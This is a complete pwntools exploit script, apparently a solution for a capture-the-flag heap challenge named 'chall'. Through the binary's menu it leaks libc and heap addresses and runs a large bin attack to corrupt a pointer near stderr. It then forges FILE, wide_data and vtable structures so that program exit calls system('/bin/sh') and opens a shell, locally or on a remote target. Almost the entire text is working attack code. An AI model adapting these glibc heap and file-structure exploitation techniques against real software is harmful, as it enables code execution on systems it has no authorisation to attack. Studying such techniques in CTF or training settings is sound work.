from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

p = start()

SMALL = 0x0
MEDIUM = 0x1
LARGE = 0x2
TEXT = 0x0
FOOTER = 0x1
HEAP_ADDR = 0x3
LIBC_ADDR = 0x6
EDIT_HEADER = 0x2
EDIT_FOOTER = 0x1
EDIT_TEXT = 0x0

class house_of_k4ki:
    def __init__(self):
        self.offset = 0x440
        self.chnk1 = 0x0
        self.fp = dict()
        self.wide_data = dict()
        self.wide_vtable = dict() 
        self.next_alloc_idx = 0x0

    def int2bytes(self, value: int):
        return bytes(str(value), 'ascii')
    
    def parseBytes(self, value: bytes):
        return value.ljust(8, b"\00")
    
    def parseAddressToInt(self, value: bytes):
        return u64(value)
    
    def read_leaked_addr(self, idx: int, nbytes: int):
        p.sendlineafter(b">", b"2")
        p.sendlineafter(b">", self.int2bytes(idx))

        p.recvuntil(b"Name: ")
        first = self.parseBytes(p.recv(nbytes))
        p.recvuntil(b"Surname: ")
        second = self.parseBytes(p.recv(6))
        p.recvuntil(b"What")
        return first
    
    def exit(self):
        p.sendlineafter(b">", b"4")
    
    def free(self, idx):
        p.sendlineafter(b">", b"3")
        p.sendlineafter(b">", self.int2bytes(idx))

    def edit(self, idx: int, to_write: bytes, offset: int = 0 , what_to_edit: int = 0):
        if(offset != 0):
            offset //= 0x8

        if offset > 3:
            print("Te has pasado con el offset")
            exit(-1)
        
        p.sendlineafter(b">", b"1")
        p.sendlineafter(b">", self.int2bytes(idx))
        p.sendlineafter(b">", self.int2bytes(what_to_edit))
        if what_to_edit != 0:
            p.sendlineafter(b">", self.int2bytes(offset))
        p.sendlineafter(b">", to_write)

    
    def alloc(self, size, footer: bool):
        footer = int(footer)
        p.sendlineafter(b">", b"0") 
        p.sendlineafter(b">", self.int2bytes(self.next_alloc_idx)) 
        p.sendlineafter(b">", self.int2bytes(size))
        p.sendlineafter(b">", self.int2bytes(footer))

        #fill values
        p.sendlineafter(b">", b"A"*4)
        p.sendlineafter(b">", b"B"*4)
        p.sendlineafter(b">", b"C"*4)
        p.sendlineafter(b">", b"D"*4)
        p.sendlineafter(b">", b"E"*30)

        self.next_alloc_idx += 1
        return self.next_alloc_idx - 1


    def large_bin_attack(self):
        self.chnk1 = self.alloc(MEDIUM, True)
        self.fp['idx'] = self.alloc(SMALL, True)

        self.free(self.chnk1) 

        libc_leak = self.read_leaked_addr(self.chnk1, LIBC_ADDR) 

        libc_base = u64(libc_leak) - 0x21ace0
        libc.address = libc_base
        log.success(hex(libc_base))

        stderr_addr = 0x406040 

        self.wide_data['idx'] = self.alloc(LARGE, False) 

        self.edit(self.chnk1, p64(stderr_addr - 0x20), 0x18, EDIT_HEADER)

        self.free(self.fp['idx']) #fp to unsorted

        self.wide_vtable['idx'] = self.alloc(LARGE, False) 

        heap_leak = self.read_leaked_addr(self.chnk1, HEAP_ADDR)

        self.fp['addr'] = u64(heap_leak) + 0x10
        self.wide_data['addr'] = self.fp['addr'] + 0x440
        self.wide_vtable['addr'] = self.wide_data['addr'] + 0x440

        log.success(hex(self.fp['addr']))
        
    
    def exploit(self):
        self.large_bin_attack()

        self.edit(self.chnk1, b"/bin/sh\0", 0x10, EDIT_FOOTER)

        _IO_stdfile_2_lock_addr = libc.address + 0x21ca60
        file_struct =   b"F"*0x58 + \
                        p64(_IO_stdfile_2_lock_addr) + \
                        b"G"*0x10 + \
                        p64(self.wide_data['addr']) + \
                        b"H"*0x30 + \
                        p64(libc.sym['_IO_wfile_jumps'] - 0x18)

        self.edit(self.fp['idx'], file_struct)

        wide_data_struct =  b"I"*0xc0 + \
                            p64(self.wide_vtable['addr'])
        self.edit(self.wide_data['idx'], wide_data_struct)

        self.edit(self.wide_vtable['idx'], p64(libc.sym['system']), 0x18, EDIT_HEADER)

        self.exit()

        
if __name__ == "__main__":
    k4ki = house_of_k4ki()
    k4ki.exploit()

    log.success("Spawning shell...")
    p.interactive()
    p.close()